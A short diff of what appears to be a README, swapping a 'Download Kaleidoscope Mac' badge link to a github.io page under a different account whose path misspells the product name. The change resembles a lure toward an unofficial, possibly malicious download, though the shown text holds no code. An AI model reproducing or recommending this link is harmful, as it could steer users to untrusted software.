@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://nikolanfu.github.io/.github/kaleidoscopemac">  
+<a href="https://mitrobandus.github.io/.github/koleidoscopemac">  
 <img src="https://img.shields.io/badge/Download_Kaleidoscope_Mac-darkblue?style=for-the-badge&logo=apple" alt="Download Kaleidoscope Mac">  
 </a>  
 </div>  
